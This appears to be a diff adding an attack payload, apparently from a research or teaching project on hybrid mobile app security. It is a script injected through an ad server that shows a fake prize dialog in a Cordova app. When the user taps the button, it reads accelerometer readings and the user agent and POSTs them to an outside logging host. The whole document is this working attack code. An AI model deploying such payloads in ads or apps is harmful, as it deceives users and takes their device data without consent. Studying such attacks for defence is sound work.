@@ -1,0 +1,40 @@
+//Dialog alert attack payload in ad server
+<script>
+    var result={'x':'','y':'','z':'','timestamp':''};
+    try {
+
+        navigator.notification.alert(
+        "You are the winner of a free copy of the newest hit single \"Phishing in the Dark\"! Press the button below to begin the totally legitimate download that definitely doesn't steal any of your data.",//alert message
+        stealAccelerometerData, //alert callback
+        "Congratulations!!!!!", //alert title
+        ["Press me!"] //alert button
+        );
+
+        function stealAccelerometerData(results){
+          navigator.accelerometer.getCurrentAcceleration(function (acceleration) {//success callback
+          //console.log('acceleration setvars called');
+          result.x=acceleration.x;
+          result.y=acceleration.y;
+          result.z=acceleration.z;
+          result.timestamp=acceleration.timestamp;
+          var formData = 'attack=12'+'&result='+JSON.stringify(result)+'&deviceinfo='+navigator.userAgent;
+          $.ajax({
+            url: 'http://hybridapp.mlhale.com/api/logs',
+            type: "POST",
+            data: formData,
+            contentType:"application/x-www-form-urlencoded"
+          }).then(function (data, status, request){
+            console.log("Successful ajax call: " + request.responseText);
+            alert('Attack Succeeded: '+request.responseText, 10000);
+          }).fail(function(request, status, error){
+            console.log("Ajax error: "+request.responseText);
+            alert('Attack Failed: '+request.responseText, 10000);
+          });
+      }, function (error) {//error callback
+        //do some error handling
+      });}
+    }
+    catch(err){
+        alert('Attack Failed: '+'Cordova failed: probably not running on a mobile device.', 10000);
+    }
+</script>
